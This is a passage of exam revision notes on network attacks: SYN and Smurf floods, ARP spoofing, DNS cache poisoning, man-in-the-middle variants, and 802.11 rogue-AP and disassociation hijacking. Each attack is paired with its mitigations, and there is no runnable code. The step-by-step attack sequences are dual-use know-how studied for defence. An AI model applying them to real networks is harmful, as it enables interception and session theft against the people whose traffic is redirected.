### 30-Second Oral Answer

- SYN flooding fills the server's half-open connection table by sending SYNs without ACKs; SYN cookies solve this by encoding state in the sequence number so no table entry is needed until the real ACK arrives.
- Smurf attacks amplify traffic by spoofing the victim's IP and pinging a broadcast address; modern routers block directed broadcasts; BCP38 prevents IP spoofing at the source.
- The amplification principle generalises to any stateless UDP protocol with larger responses than requests.

### Typical Exam Questions

- Explain how a SYN flood causes a DoS and how SYN cookies mitigate the resource exhaustion.
- What is the Smurf attack? If the amplification factor is 100, how does that occur?
- How do modern networks mitigate Smurf-style amplification attacks?
- Calculate the bandwidth of a DoS attack: 100,000 pps at 512 bytes each.

### Common Pitfalls

- Thinking SYN cookies prevent the flood — they don't. They prevent resource exhaustion by not allocating table entries.
- Confusing the Smurf attack (ICMP broadcast) with DNS amplification (reflection) — same principle, different protocol.
- Forgetting that IP spoofing is the prerequisite for both SYN flooding and Smurf attacks.

### Related Concepts

- [[DDoS, Alarm Quality, and Detection Interpretation|DDoS, Alarm Quality, and Detection Interpretation]]
- [[IDS, IPS, HIDS, NIDS, and Detection Models|IDS, IPS, HIDS, NIDS, and Detection Models]]
- [[Firewalls, DMZs, Proxy Firewalls, SSH Tunnels, and VPNs|Firewalls, DMZs, Proxy Firewalls, SSH Tunnels, and VPNs]]

## ARP Spoofing, DNS Cache Poisoning, and Traffic Redirection

> [!abstract] Why this note matters
> - Tutorial L8 explicitly asks about ARP spoofing and DNS cache poisoning.
> - These attacks make good exam material because they require explaining name or address trust failures clearly.

### Overview

Both ARP spoofing and DNS cache poisoning redirect trust rather than breaking encryption directly. They exploit a naming or addressing layer that users and systems normally assume is correct.

Because they operate below or before the application logic, these attacks can redirect legitimate-looking traffic into malicious paths without requiring the victim to type a different URL or choose a different gateway manually.

### Exam Focus

- Tier 2 priority.
- Written to align with the provided lectures, tutorials, solutions, labs, and syllabus.

### Core Definitions

- **ARP spoofing**: Sending forged ARP messages to convince hosts that an IP address maps to the attacker's MAC address.
- **DNS cache poisoning**: Inserting false domain-to-IP mappings into a resolver cache so later users are redirected.
- **traffic redirection**: Manipulating the path or destination of communication so victims send data to the attacker or a malicious server.

### Detailed Explanation

ARP spoofing targets local networks. If a victim believes the gateway IP belongs to the attacker's MAC address, the victim can send traffic to the attacker instead of the real gateway. This is a classic man-in-the-middle setup on a LAN.

DNS cache poisoning attacks the translation from names to IP addresses. If the resolver cache contains a false mapping for a domain, users can be sent to a malicious host even when they typed the correct domain name.

These attacks differ in layer and scope, but the shared lesson is that secure systems depend on trustworthy resolution and routing context. A secure application sitting on top of poisoned resolution or link-layer deception can still fail in practice.

That is why these are traffic-redirection attacks rather than simple credential-theft attacks. The attacker wins first by changing where trust points, and only later may steal data or credentials from the redirected traffic.

This is also why mitigations often live in infrastructure rather than only in the application itself. Secure name resolution, network segmentation, authenticated higher-layer channels, and anomaly detection all help because they reduce the attacker's ability to silently rewrite who the victim thinks they are talking to.

#### ARP Spoofing Mitigations

Tutorial L8 Part B explicitly asks for ARP-spoofing mitigations in a large corporate LAN. Three approaches:

- **Static ARP entries.** Hard-code the IP-to-MAC mapping for critical devices (e.g., the gateway) so the host ignores incoming ARP replies for those IPs. Downside: high maintenance overhead — every address or hardware change requires a configuration update across affected hosts.
- **802.1X port-based authentication.** Require every device to authenticate to the switch before it gets a usable port. An unauthorised attacker cannot even send ARP frames onto the network. Downside: needs modern switch hardware and supplicant configuration on every endpoint.
- **Dynamic ARP Inspection (DAI).** A switch feature that validates ARP packets against a trusted IP-to-MAC binding table (often built from DHCP snooping). Forged ARP replies are dropped at the switch port. Downside: complex configuration and only works on managed switches that support it.

#### DNS Cache Poisoning Mitigations

DNS poisoning typically works by an attacker racing to send a forged response that matches the legitimate query's transaction ID and source port before the real reply arrives. Four mitigations narrow the attacker's window:

- **Source-port randomisation.** Instead of querying from a predictable UDP port, the resolver picks a random source port per query. The attacker must now guess port × transaction ID, raising the entropy by ~16 bits.
- **Transaction-ID randomisation.** The 16-bit DNS transaction ID is chosen unpredictably so the attacker cannot pre-compute it.
- **0x20 encoding.** The resolver randomly mixes the case of letters in the query name (e.g., `wWw.eXamplE.cOm`). Compliant authoritative servers preserve the case in the response. An attacker forging a response without knowing the random capitalisation produces a mismatch.
- **DNSSEC.** Records are cryptographically signed by the zone's authority. A resolver that validates DNSSEC signatures cannot accept a forged record at all, regardless of port or ID matching. This is the only countermeasure that defeats the attack outright rather than just narrowing the window.

### How It Works

ARP spoofing changes local link-layer destination decisions.

DNS poisoning changes application-layer name resolution results.

Both attacks redirect traffic by tampering with trust in supporting infrastructure.

If the redirection succeeds, the victim may continue to believe they are interacting with the correct destination because the visible workflow has not changed.

### What You Must Know

- How ARP spoofing works on a LAN.
- How DNS cache poisoning redirects users.
- Why these are traffic-redirection attacks rather than simple password attacks.

### 30-Second Oral Answer

- ARP spoofing lies about who owns an IP address on the local network; DNS poisoning lies about what IP a domain name should resolve to.
- Both attacks redirect traffic by corrupting trust in resolution layers.

### Typical Exam Questions

- How does ARP spoofing work?
- How does DNS cache poisoning redirect users?
- Why are switched LANs relevant to packet observation in network attacks?

### Common Pitfalls

- Confusing ARP spoofing with IP source-address spoofing in remote networks.
- Treating DNS poisoning as merely changing a local hosts file on one machine.
### Related Concepts

- [[IDS, IPS, HIDS, NIDS, and Detection Models|IDS, IPS, HIDS, NIDS, and Detection Models]]
- [[Web Architecture, HTTP, Cookies, and the Browser Security Model|Web Architecture, HTTP, Cookies, and the Browser Security Model]]
- [[Man-in-the-Middle Scenarios — LAN, DNS, Wireless, Transport|Man-in-the-Middle Scenarios — LAN, DNS, Wireless, Transport]]

## Man-in-the-Middle Scenarios — LAN, DNS, Wireless, Transport

> [!abstract] Why this note matters
> - The past exam included a MITM-style multiple-choice question asking which scenario "intercepts key exchange messages and substitutes public keys".
> - MITM is not one attack — it is a *family* of attacks that operate at different network layers with different mechanisms.
> - This note consolidates the four MITM variants the course covers so each can be recognised quickly from a scenario description.

### Overview

A man-in-the-middle (MITM) attack places an attacker between two communicating parties so that they each believe they are talking to the other, while in fact every message passes through the attacker. The defining feature is **substituted identity**: the attacker convinces each end that they are the other end.

MITM attacks can happen at any layer where identity is trusted but not cryptographically verified. The four variants in the course span the stack: link layer (ARP spoofing), name-resolution layer (DNS cache poisoning), wireless link layer (rogue AP and disassociation hijack), and transport layer (downgrade attacks and key-exchange substitution).

Exam questions usually describe a scenario and ask you to name the variant. The diagnostic question is always the same: **which trust relationship is being substituted, and at what layer?**

### Exam Focus

- Tier 1 priority — past exam asked for the "substituted public keys at key exchange" variant.
- Written to align with the provided lectures, tutorials, solutions, labs, and syllabus.

### Core Definitions

- **MITM (man-in-the-middle)**: An attack where the adversary sits between two parties, relaying and possibly modifying messages while each party believes the other is the only peer.
- **ARP spoofing**: Forging ARP replies to bind an IP address (often the gateway) to the attacker's MAC.
- **DNS cache poisoning**: Inserting false name-to-IP mappings into a resolver's cache.
- **rogue AP**: An unauthorised wireless access point that impersonates a legitimate one.
- **disassociation hijack**: Forging an 802.11 disassociate frame so the attacker can take over the victim's session.
- **SSL strip / HTTPS downgrade**: Forcing or tricking a client into using HTTP rather than HTTPS so traffic can be read in cleartext.
- **key-exchange substitution**: An MITM during a key-establishment protocol where the attacker replaces each party's public key with their own.

### Detailed Explanation

#### LAN Layer: ARP Spoofing

ARP maps an IP address to a MAC address on a local network. The protocol has no authentication — any host can send an ARP reply claiming any IP. If the victim caches the false mapping, traffic destined for the legitimate IP (typically the gateway) goes to the attacker's MAC instead.

The attacker then forwards traffic to the real gateway, completing the MITM. The victim sees normal connectivity; the attacker sees every packet.

Scope: local subnet only. ARP does not cross routers.

See [[ARP Spoofing, DNS Cache Poisoning, and Traffic Redirection|ARP Spoofing, DNS Cache Poisoning, and Traffic Redirection]] for mitigations.

#### Name-Resolution Layer: DNS Cache Poisoning

DNS translates names to IP addresses. If an attacker can inject a false mapping into a resolver's cache, every subsequent client query for that name receives the attacker's IP. The client connects to the attacker thinking it is the legitimate server.

The attacker may then relay traffic to the real server (full MITM) or simply impersonate the server. Either way, the redirection happens before any application-layer handshake — the client never sees the "real" server in DNS at all.

Scope: as wide as the poisoned resolver's user base.

See [[ARP Spoofing, DNS Cache Poisoning, and Traffic Redirection|ARP Spoofing, DNS Cache Poisoning, and Traffic Redirection]] for source-port and transaction-ID mitigations.

#### Wireless Link Layer: Rogue AP and Disassociation Hijack

Two wireless MITM variants exist:

**Rogue AP**: The attacker stands up an access point that advertises the same SSID and security policy as a legitimate AP. Because the standard does not require mutual authentication of the AP to the STA, the victim may associate with the rogue. The rogue then relays traffic to the real AP — a classic MITM at the wireless link layer.

**Disassociation hijack**: The attacker observes a legitimate STA's session and sends a forged disassociate frame to the STA spoofing the AP's MAC. The STA drops its end. The attacker, spoofing the STA's MAC, continues the session with the real AP. This is technically session theft rather than relay, but it has the same effect: the attacker is now the active party in the connection.

Both rely on the fact that 802.11 management frames are not cryptographically authenticated in the original design.

See [[Wireless and WLAN Security, 802.11, Rogue APs, and Session Hijacking|Wireless and WLAN Security, 802.11, Rogue APs, and Session Hijacking]] for the full sequence.

#### Transport Layer: Downgrade Attacks and Key-Exchange Substitution

Two transport-layer MITM variants:

**SSL strip / HTTPS downgrade**: The attacker intercepts a victim's connection and rewrites HTTPS links to HTTP, or terminates HTTPS at the attacker and relays as HTTP to the victim. The victim sees a working but unencrypted connection. HSTS and HTTPS-only browsers mitigate this.

**Key-exchange substitution**: During a Diffie-Hellman or similar key exchange, the attacker intercepts each party's public value and substitutes their own. The victim establishes a key with the attacker, and the attacker establishes a separate key with the real peer. Both endpoints think they share a secret with each other; in fact each shares a secret with the attacker, who can decrypt and re-encrypt every message.

This second variant is the one the past exam targets — the "intercepts key exchange messages and substitutes public keys" wording is the verbatim signature of a key-exchange MITM. The standard defence is **authenticated key exchange**: the public values must be signed by a trusted identity (certificate, pre-shared key, or out-of-band fingerprint) so the receiver can detect substitution.

### How It Works

ARP spoofing -> forged ARP reply -> victim's ARP cache maps gateway IP to attacker MAC -> traffic flows through attacker.

DNS cache poisoning -> false A/AAAA record in resolver cache -> client connects to attacker's IP for that name.

Rogue AP -> impersonates SSID/policy -> STA associates -> attacker relays to real AP.

Disassociation hijack -> spoof AP's MAC to disassociate STA -> spoof STA's MAC to continue session with AP.

SSL strip -> rewrite HTTPS to HTTP between victim and attacker; relay to real server over HTTPS.

Key-exchange substitution -> intercept and replace each party's public key with attacker's own -> attacker holds separate keys with each side -> attacker decrypts and re-encrypts every message.

### What You Must Know

- The four MITM variants and the layer each operates at: link (ARP), name (DNS), wireless link (rogue AP / disassociation), transport (downgrade / key substitution).
- The diagnostic question: which trust relationship is being substituted, and at what layer?
- The key-exchange substitution variant is detected only with authenticated key exchange (signed public values, certificates, or out-of-band verification).
- The wireless variants exploit the lack of mutual authentication and unauthenticated management frames.
- SSL strip / HTTPS downgrade is defeated by HSTS and HTTPS-only browser behaviour.

### 30-Second Oral Answer

- MITM is a family: ARP spoofing on a LAN, DNS cache poisoning at name resolution, rogue APs and disassociation hijacking on wireless, and transport-layer downgrade or key-exchange substitution.
- They differ in which trust relationship is substituted and at what layer.
- Key-exchange substitution is the "intercepts public keys" variant and is defeated by authenticated key exchange.

### Typical Exam Questions

- An attacker intercepts key exchange messages and substitutes public keys. Which class of attack is this? *(Answer: a transport-layer MITM via key-exchange substitution; mitigate with authenticated key exchange.)*
- Name a MITM attack that operates at the link layer of a LAN.
- How does a rogue AP enable a MITM on a wireless network?
- What is SSL strip and how is it defeated?
- Why does an unauthenticated Diffie-Hellman exchange permit MITM?

### Common Pitfalls

- Treating MITM as one attack. The exam expects you to name the layer and mechanism.
- Confusing ARP spoofing with IP source-address spoofing. ARP spoofing happens on the local segment; IP spoofing happens at the network layer and does not require subnet membership.
- Forgetting that the wireless session-hijack uses *two* MAC addresses (attacker spoofs the AP's MAC for the disassociate and the STA's MAC to continue the session).
- Believing that encryption alone defeats MITM. Encryption without authentication of the key exchange leaves the channel open to substitution.

### Concrete Examples and Commands

#### Key-exchange substitution (past-exam variant)

```text
Alice and Bob attempt Diffie-Hellman key exchange.
Eve sits between them.

Alice -> Eve: g^a
Eve   -> Bob: g^e1     (substitute)
Bob   -> Eve: g^b
Eve   -> Alice: g^e2   (substitute)

Alice and Eve share key K1 = g^(a*e2).
Bob and Eve share key K2 = g^(b*e1).
Each thinks they share a key with the other.
Eve decrypts each message with one key, re-encrypts with the other.
```

#### MITM diagnostic table

| Scenario clue | Layer | Variant |
|---------------|-------|---------|
| "Forged ARP reply" / "gateway IP mapped to attacker MAC" | Link (LAN) | ARP spoofing |
| "Resolver cache" / "false name-to-IP mapping" | Name resolution | DNS cache poisoning |
| "Impersonated SSID" / "STA associates with attacker AP" | Wireless link | Rogue AP |
| "Disassociate frame with AP's MAC" | Wireless link | Disassociation hijack |
| "Rewrites HTTPS to HTTP" | Transport | SSL strip / HTTPS downgrade |
| "Intercepts public keys during key exchange" | Transport | Key-exchange substitution |

### Related Concepts

- [[ARP Spoofing, DNS Cache Poisoning, and Traffic Redirection|ARP Spoofing, DNS Cache Poisoning, and Traffic Redirection]]
- [[Wireless and WLAN Security, 802.11, Rogue APs, and Session Hijacking|Wireless and WLAN Security, 802.11, Rogue APs, and Session Hijacking]]
- [[Firewalls, DMZs, Proxy Firewalls, SSH Tunnels, and VPNs|Firewalls, DMZs, Proxy Firewalls, SSH Tunnels, and VPNs]]
- [[SSH Protocol, Authentication, and Tunneling|SSH Protocol, Authentication, and Tunneling]]

## Wireless and WLAN Security, 802.11, Rogue APs, and Session Hijacking

> [!abstract] Why this note matters
> - Lecture 8 dedicates a large section to WLAN security and the fundamental flaws of 802.11.
> - This is the most visible gap in the existing notes; WLAN material can produce both factual MC questions (frame types, BSS vs ESS) and reasoning questions (why is a rogue AP a MITM vector? why does a disassociate frame enable hijacking?).
> - The lecture treats wireless as a different threat model from wired networks: physical-presence assumptions break, link-layer encryption stops at the AP, and shared keys in hotspots invite peer attackers.

### Overview

Wired LAN security implicitly assumes that an attacker must be physically present on the wire. WLANs erase that assumption — anyone within radio range can listen, transmit, or impersonate. The 802.11 standard therefore must rebuild trust without the cable.

The course treats WLAN security in two parts. First, the architecture: stations, access points, authentication servers, the distribution system, and how a station joins a network through probes, beacons, and association. Second, the attacks: rogue APs as a man-in-the-middle vector, session hijacking via forged disassociate frames, and war-driving for reconnaissance. Both parts share the same root cause: shared keys, lack of mutual authentication, and the loss of any physical-presence basis for trust.

### Exam Focus

- Tier 1 priority — this is a large lecture section with no existing concept note.
- Written to align with the provided lectures, tutorials, solutions, labs, and syllabus.

### Core Definitions

- **IEEE 802.11**: The family of standards for wireless LANs (Wi-Fi). Analogous to IEEE 802.3 (Ethernet) for wired LANs.
- **STA (Station)**: A mobile device that connects to an access point via radio frequencies.
- **AP (Access Point)**: A device that connects wireless stations to a wired network.
- **AS (Authentication Server)**: A back-end server that handles authentication decisions for stations joining a WLAN.
- **DS (Distribution System)**: The infrastructure (typically wired) that links APs together and to the wider network.
- **SSID (Service Set Identifier)**: The WLAN name, up to 32 characters, visible in plaintext in management frames. Not a secret.
- **BSSID (Basic Service Set Identifier)**: The MAC address of the AP — uniquely identifies one AP.
- **ESSID (Extended Service Set Identifier)**: The identifier for an extended service set (a group of BSSs that look like one logical network).
- **BSS (Basic Service Set)**: One AP plus its associated stations.
- **ESS (Extended Service Set)**: Multiple BSSs that share an ESSID and form one logical WLAN.
- **IBSS (Independent Basic Service Set)**: An ad-hoc set of stations communicating directly without any AP.
- **rogue AP**: An unauthorised access point that impersonates a legitimate one to lure stations into associating with it.
- **disassociate frame**: An 802.11 management frame instructing a station to drop its connection to an AP.
- **war driving**: Scanning radio channels (often from a moving vehicle) to discover in-range wireless networks.

### Detailed Explanation

#### 802.11 vs 802.3

Ethernet (802.3) dominates wired LANs. Wi-Fi (802.11) is the wireless analogue. Both expose the same upper-layer interface so that higher layers (IP, TCP, applications) do not need to know which medium is underneath. The differences live at the physical and data-link layers — and security depends on those differences.

#### Frame Types in 802.11

802.11 uses three categories of frames:

| Frame type | Purpose |
|------------|---------|
| **Data** | Carry upper-layer payloads and authentication messages. |
| **Management** | Carry beacons, probes, association requests/responses, and disassociate frames. |
| **Control** | Coordinate access to the shared wireless medium (acknowledgements, request-to-send, clear-to-send). |

The split matters for attacks. Management frames such as disassociate are not authenticated in the original 802.11 design, which is why session hijacking by spoofed disassociates works.

#### WLAN Components

- **STA**: the user's device (laptop, phone).
- **AP**: the bridge between wireless STAs and the wired network.
- **AS**: external authentication server (used in enterprise WPA2/3 with 802.1X).
- **DS**: the infrastructure connecting APs and the rest of the network.

#### SSID vs BSSID vs ESSID

The SSID is just a network *name*. It is broadcast in plaintext in beacons and probes, so "hiding" the SSID is not security — only mild obscurity.

The BSSID is the MAC address of an AP. Every AP has one. The ESSID identifies an extended service set: when several APs coordinate to provide one logical Wi-Fi network (typical for offices and campuses), they share an ESSID even though each has its own BSSID.

#### Infrastructure vs Ad-Hoc Mode

- **Infrastructure mode**: STAs talk to an AP, which talks to the wired network. STAs + AP = BSS; many BSSs form an ESS.
- **Ad-hoc mode**: STAs talk directly to each other without an AP. This is an IBSS.

Most real Wi-Fi deployments are infrastructure mode.

#### Multicast and Broadcast Addresses

A unicast address picks one recipient, a multicast address picks a group, and a broadcast address picks every device on the LAN. In infrastructure mode, APs send multicast messages directly; STAs send through the AP. Broadcasts use a group key shared by all devices on the WLAN — useful, but exposing the group key to all participants enlarges the attack surface.

#### Association Sequence: Beacons, Probes, Authentication

For a STA to connect to an AP, four steps occur:

1. The STA sends probe messages looking for APs. APs also advertise themselves with periodic beacon frames.
2. The STA selects an AP and runs a low-level 802.11 authentication (shared-key or open-system).
3. The STA initiates the association request sequence.
4. Before data frames are accepted, an upper-layer 802.1X authentication (in enterprise setups) must complete successfully.

Each step is a candidate attack surface: spoofed beacons enable rogue APs, spoofed disassociate frames break the association.

#### AP Security Policy in Beacons and Probes

The AP advertises its security policy inside elements carried in beacon and probe frames. Those elements list which authentication methods, which encryption suites, and which external authentication server the AP supports. The STA then picks a compatible security suite for the connection.

Because beacons are plaintext and unauthenticated, an attacker can read the AP's advertised policy and either downgrade negotiations or set up a rogue AP that advertises a weaker policy.

#### Rogue AP as a Man-in-the-Middle Vector

A rogue AP exploits the lack of mutual authentication between STA and AP. The attacker stands up an AP that advertises the same SSID (and often the same security policy) as the legitimate one. The victim STA associates with the rogue AP because there is no cryptographic check that the AP is genuine.

Once associated, the rogue AP relays messages and credentials to the real AP, acting as a man-in-the-middle. From the STA's perspective, the network looks normal. From the AP's perspective, the rogue is just another station.

This is the wireless analogue of a transport-layer MITM. The relevant defence is mutual authentication — both ends must prove identity, which simple shared-key models do not provide.

#### Session Hijacking via Forged Disassociate Frames

The session-hijacking attack exploits two facts. First, management frames in the original 802.11 design are not authenticated. Second, MAC addresses are not secrets — they are observable on the radio channel.

The attack sequence:

1. The victim STA authenticates and associates with the real AP.
2. The attacker, using the **AP's MAC address as the source**, sends a forged disassociate frame to the victim STA. The STA believes the AP is dropping it and disassociates.
3. The attacker, now using the **STA's MAC address as the source**, continues the session with the real AP. The AP cannot tell that the original STA is no longer present.

The attacker has hijacked the session at the link layer without ever cracking the encryption. The attack is possible whenever management frames are not cryptographically authenticated and only relies on link-layer encryption.

#### War Driving and NetStumbler

War driving is the practice of scanning radio channels for in-range wireless networks, often while moving through an area. It can be passive (just listen to beacons) or active (send probe requests to trigger AP responses). NetStumbler is a classic tool for this kind of wireless enumeration.

The result is a map of nearby networks, their SSIDs, BSSIDs, security policies, and signal strengths — useful for reconnaissance before any actual attack.

#### Link-Layer vs End-to-End Security

A WLAN link is **between the STA and the AP**, not end-to-end. WPA2/3 protects that single radio hop. Once the data reaches the AP, it is decrypted and forwarded over the wired network in cleartext (unless an end-to-end protocol such as TLS also covers it).

This is why link-layer wireless encryption does not protect data from the AP onward. An attacker who compromises the AP, or who can read traffic on the wired side, sees plaintext. The course emphasises that WLAN encryption is not a substitute for end-to-end protection.

#### Shared-Key Risks in Hotspots

Public Wi-Fi hotspots often use a single shared key for all users (or no key at all). In that model, any user on the hotspot can decrypt other users' traffic, because everyone holds the same key. This is a structural risk, not an implementation bug: shared keys mean shared access.

#### Loss of Physical-Presence Threat Assumption

The fundamental shift from wired to wireless is the **loss of physical-presence as a security assumption**. On a wired LAN, an attacker needs to be in the building and plugged in. On a WLAN, anyone within radio range can passively listen, actively probe, or impersonate.

Three consequences follow:

- Trust is harder to assume — physical access used to imply trust by proxy.
- Rogue APs are always a concern because the medium is open.
- Shared keys in hotspots compound risk because the "perimeter" is now everyone in radio range.

### How It Works

Beacons/probes -> AP advertises -> STA selects AP -> low-level 802.11 auth -> association request -> (optional) 802.1X upper-layer auth -> data frames flow.

Rogue AP -> impersonates legitimate AP -> STA associates -> attacker relays to real AP -> MITM established.

Session hijack -> attacker spoofs disassociate (AP's MAC -> STA) -> STA drops -> attacker spoofs STA's MAC -> continues session with AP.

WLAN encryption -> protects STA-to-AP hop only -> AP decrypts -> wired side is cleartext unless end-to-end is added.

### What You Must Know

- Wi-Fi is 802.11, Ethernet is 802.3, and they expose the same upper-layer interface.
- Three frame types: data, management, control. Management frames carry beacons, probes, associations, and disassociates.
- WLAN components: STA, AP, AS, DS.
- SSID is the network name; BSSID is the AP's MAC; ESSID is the identifier for an ESS.
- BSS = AP + STAs; ESS = multiple BSSs; IBSS = ad-hoc, no AP.
- Association sequence: probe/beacon -> low-level auth -> association request -> (802.1X if enterprise).
- AP security policy is advertised in beacons and probes.
- A rogue AP is a MITM vector because there is no mutual authentication.
- Session hijacking uses forged disassociate frames spoofed from the AP's MAC.
- War driving with NetStumbler is for reconnaissance, not exploitation by itself.
- WLAN encryption is link-layer only — decrypted at the AP.
- Shared keys in hotspots let peers attack peers.
- The loss of physical presence as a trust basis is the structural shift in wireless threat models.

### 30-Second Oral Answer

- 802.11 frames split into data, management, and control; management frames carry the association sequence and disassociates.
- A rogue AP impersonates the legitimate AP because mutual authentication is missing, putting itself between the STA and the real AP.
- Session hijacking forges a disassociate frame with the AP's MAC, kicks the STA off, then continues the session under the STA's MAC.
- WLAN encryption is link-only — the AP decrypts on receipt, so wireless protection ends at the AP.

### Typical Exam Questions

- What is the difference between SSID, BSSID, and ESSID?
- Describe the association sequence a STA goes through to join an AP.
- Why is a rogue AP a man-in-the-middle attack?
- How does an attacker hijack a wireless session using disassociate frames?
- Why is link-layer wireless encryption not equivalent to end-to-end security?
- Why are shared keys in public Wi-Fi hotspots structurally risky?

### Common Pitfalls

- Thinking that hiding an SSID provides security. It is broadcast in management frames and visible to anyone listening.
- Confusing BSSID (one AP's MAC) with SSID (a network name).
- Believing WLAN encryption protects the whole path. It only protects the STA-to-AP hop.
- Forgetting that the attacker spoofs the AP's MAC for the disassociate and the STA's MAC for continuing the session.
- Treating ad-hoc (IBSS) and infrastructure (BSS/ESS) modes as interchangeable.

### Concrete Examples and Commands

#### Rogue AP MITM shape

```text
Real AP (legit BSSID, SSID "CompanyWiFi")  ---  Authentication Server
                                                 |
Attacker stands up rogue AP advertising SSID "CompanyWiFi"
                                                 |
Victim STA associates with the rogue (no mutual auth)
                                                 |
Rogue AP relays frames to the real AP, reads/modifies in transit
```

#### Session hijack via disassociate

```text
1. STA --(authenticates and associates)--> AP
2. Attacker --(disassociate, src = AP's MAC)--> STA
   STA drops its end of the connection.
3. Attacker --(continues session, src = STA's MAC)--> AP
   AP keeps the association open because frames arrive from "STA".
```

#### War driving with NetStumbler (passive)

```text
NetStumbler listens to beacons on each channel.
Records: SSID, BSSID, channel, signal strength, advertised security policy.
Output: a map of all in-range APs — used for reconnaissance.
```

### Related Concepts

- [[Man-in-the-Middle Scenarios — LAN, DNS, Wireless, Transport|Man-in-the-Middle Scenarios — LAN, DNS, Wireless, Transport]]
- [[Firewalls, DMZs, Proxy Firewalls, SSH Tunnels, and VPNs|Firewalls, DMZs, Proxy Firewalls, SSH Tunnels, and VPNs]]
- [[ARP Spoofing, DNS Cache Poisoning, and Traffic Redirection|ARP Spoofing, DNS Cache Poisoning, and Traffic Redirection]]
- [[Packet Sniffing, Promiscuous Mode, Switched LANs, and NIDS Visibility|Packet Sniffing, Promiscuous Mode, Switched LANs, and NIDS Visibility]]
